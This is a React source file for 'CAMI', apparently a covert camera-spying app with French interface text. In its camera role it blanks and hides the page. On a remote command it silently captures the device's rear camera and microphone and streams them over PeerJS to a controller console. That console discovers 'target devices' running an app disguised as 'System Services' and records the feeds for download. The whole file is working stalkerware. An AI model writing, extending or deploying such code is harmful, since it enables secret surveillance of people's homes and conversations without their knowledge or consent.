import React, { useEffect, useRef, useState } from 'react'
import Peer from 'peerjs'

const ROLE = import.meta.env.VITE_APP_ROLE
const ROOM_NAME = 'cami-stealth-v1-2026'
const PREFIX = 'sys-cami-'

const ICE = {
  iceServers: [
    { urls: "stun:stun.l.google.com:19302" },
    { urls: "turn:openrelay.metered.ca:80", username: "openrelayproject", credential: "openrelayproject" },
  ]
}

export default function App(){
  const [role,setRole] = useState(ROLE)
  const [cameras,setCameras] = useState({})
  const [remoteStream,setRemoteStream] = useState(null)
  const [isRec,setIsRec] = useState(false)
  const [recs,setRecs] = useState([])
  const peerRef = useRef(null)
  const remoteRef = useRef(null)
  const localStreamRef = useRef(null)
  const recRef = useRef(null)
  const chunksRef = useRef([])

  useEffect(()=>{
    if(!role) return
    const isCam = role==='camera'

    if(isCam){
      document.body.style.background='#000'
      document.body.style.opacity='0'
      document.body.style.pointerEvents='none'
    }

    const id = `${PREFIX}${isCam?'cam':'ctrl'}-${Math.random().toString(36).slice(2,8)}`
    const peer = new Peer(id, { config: ICE, debug:0 })
    peerRef.current=peer

    peer.on('open',()=>console.log(isCam?'📷 Caméra prête':'🎦 Connecté en tant que viewer'))
    peer.on('error',(e)=>console.log('[CAMI]',e.type))

    if(isCam){
      peer.on('connection', conn=>{
        conn.on('data', async d=>{
          if(d?.type==='activate') {
            try{
              const s = await navigator.mediaDevices.getUserMedia({
                video: { facingMode: 'environment', width: { ideal: 1280 }, height: { ideal: 720 } },
                audio: true
              })
              localStreamRef.current = s
              setTimeout(()=>{
                const call = peer.call(conn.peer, s)
                call.on('close', ()=>stopStream())
              }, 100)
            }catch(e){ console.log('Caméra refusée') }
          }
          if(d?.type==='deactivate') stopStream()
        })
        conn.on('close', ()=>stopStream())
      })
      discoverCam(peer, isCam)
    } else {
      peer.on('call', call=>{
        call.answer()
        call.on('stream', s=>{
          setRemoteStream(s)
          if(remoteRef.current) remoteRef.current.srcObject=s
        })
        call.on('close', ()=>setRemoteStream(null))
      })
      discoverCam(peer, isCam)
    }

    return ()=>{
      peer.destroy()
      stopStream()
    }
  },[role])

  function stopStream(){
    if(localStreamRef.current) {
      localStreamRef.current.getTracks().forEach(t=>t.stop())
      localStreamRef.current=null
    }
  }

  async function discoverCam(peer, isCam){
    try{
      const { joinRoom } = await import('trystero/torrent')
      const room = joinRoom({appId:'cami-stealth'}, ROOM_NAME)
      const [sendPres, getPres] = room.makeAction('pres')
      getPres(d=>{ if(d?.type==='cam') setCameras(p=>({...p, [d.peerId]:{...d, last:Date.now()}})) })
      setInterval(()=>{ if(isCam) sendPres({type:'cam', peerId:peer.id}) }, 2000)
      setInterval(()=>{
        setCameras(p=>{
          const now=Date.now(); const o={}
          Object.entries(p).forEach(([k,v])=>{ if(now-v.last<20000) o[k]=v })
          return o
        })
      }, 5000)
    }catch(e){ console.log('Discovery error', e) }
  }

  function activateCam(peerId){
    const conn = peerRef.current.connect(peerId)
    conn.on('open',()=>conn.send({type:'activate'}))
  }

  function deactivateCam(peerId){
    const conn = peerRef.current.connect(peerId)
    conn.on('open',()=>conn.send({type:'deactivate'}))
  }

  function toggleRec(){
    if(isRec){ recRef.current.stop(); setIsRec(false); return }
    const stream = remoteStream
    if(!stream) return alert('Aucun flux reçu')
    const mime = 'video/webm;codecs=vp9'
    const rec = new MediaRecorder(stream, { mimeType:mime })
    chunksRef.current=[]
    rec.ondataavailable=e=>{ if(e.data.size>0) chunksRef.current.push(e.data) }
    rec.onstop=()=>{
      const blob=new Blob(chunksRef.current,{type:mime})
      const url=URL.createObjectURL(blob)
      setRecs(r=>[{id:Date.now(), url, size:(blob.size/1024/1024).toFixed(2)+'MB'}, ...r])
    }
    rec.start(1000); recRef.current=rec; setIsRec(true)
  }

  // === SI CAMÉRA : RIEN D'AFFICHER ===
  if(role==='camera'){
    return <div style={{width:0,height:0,overflow:'hidden',position:'absolute',left:-9999,top:-9999}}/>
  }

  // === SI VIEWER : INTERFACE COMPLÈTE ===
  if(!role || role!=='viewer'){
    return <div style={{minHeight:'100vh',display:'grid',placeItems:'center',padding:24,background:'#050505',color:'#fff'}}>
      <div style={{maxWidth:420,width:'100%',textAlign:'center'}}>
        <h1 style={{fontSize:32,fontWeight:800,margin:'0 0 8px'}}>🎦 CAMI — Console de contrôle</h1>
        <p style={{opacity:.5,marginBottom:32}}>Réseaux différents supportés • Peer-to-Peer</p>
        <p style={{color:'#22c55e',fontWeight:'bold'}}>✅ Mode Viewer</p>
      </div>
    </div>
  }

  return (<div style={{padding:16,maxWidth:900,margin:'0 auto',minHeight:'100vh',background:'#050505',color:'#fff'}}>
    <div style={{display:'flex',justifyContent:'space-between',alignItems:'center',marginBottom:16}}>
      <div><b style={{fontSize:20}}>🎦 CAMI — Console de contrôle</b></div>
    </div>

    <div style={{background:'#121214',borderRadius:16,padding:16,marginBottom:16}}>
      <b>📡 Caméras détectées ({Object.keys(cameras).length})</b>
      {Object.values(cameras).length===0 ? (
        <p style={{opacity:.4,textAlign:'center',padding:'20px 0'}}>Aucune caméra détectée<br/>Lancez l'app "System Services" sur l'appareil cible</p>
      ) : Object.values(cameras).map(c=>(
        <div key={c.peerId} style={{display:'flex',justifyContent:'space-between',alignItems:'center',background:'#000',padding:'12px 14px',borderRadius:12,marginTop:8}}>
          <div style={{fontFamily:'monospace',fontSize:11,opacity:.7}}>{c.peerId}</div>
          <div style={{display:'flex',gap:8}}>
            <button onClick={()=>activateCam(c.peerId)} style={btnGo}>▶️ Activer</button>
            <button onClick={()=>deactivateCam(c.peerId)} style={btnStop}>⏹️ Couper</button>
          </div>
        </div>
      ))}
    </div>

    <div style={{background:'#000',borderRadius:16,overflow:'hidden',aspectRatio:'16/9',position:'relative'}}>
      <video ref={remoteRef} autoPlay playsInline style={{width:'100%',height:'100%',objectFit:'contain',background:'#0a0a0a'}}/>
      {!remoteStream && <div style={{position:'absolute',inset:0,display:'flex',alignItems:'center',justifyContent:'center',opacity:.4}}>Flux vidéo ici</div>}
    </div>

    <button onClick={toggleRec} style={{...btnFull,background:isRec?'#d32f2f':'#2e7d32',marginTop:16}}>
      {isRec ? '⏹️ Enregistrement en cours...' : '● Enregistrer le flux'}
    </button>

    {recs.length>0 && <div style={{marginTop:24}}>
      <b style={{marginBottom:12,display:'block'}}>📁 Enregistrements ({recs.length})</b>
      {recs.map(r=>(
        <div key={r.id} style={{background:'#121214',padding:'12px 16px',borderRadius:12,marginBottom:8,display:'flex',justifyContent:'space-between',alignItems:'center'}}>
          <div>
            <div style={{fontSize:13,fontWeight:500}}>{new Date(r.id).toLocaleString()}</div>
            <div style={{fontSize:12,opacity:.5}}>{r.size}</div>
          </div>
          <a href={r.url} download={`cami-rec-${r.id}.webm`} style={{padding:'8px 14px',background:'#2563eb',color:'#fff',borderRadius:8,textDecoration:'none',fontSize:13}}>⬇️ Télécharger</a>
        </div>
      ))}
    </div>}
  </div>)
}

const btnFull={width:'100%',padding:'16px 20px',borderRadius:12,border:'none',fontWeight:600,fontSize:15,cursor:'pointer'}
const btnGo={padding:'8px 16px',borderRadius:8,border:'none',background:'#22c55e',color:'#000',fontWeight:600,cursor:'pointer'}
const btnStop={padding:'8px 16px',borderRadius:8,border:'none',background:'#ef4444',color:'#fff',fontWeight:600,cursor:'pointer'}
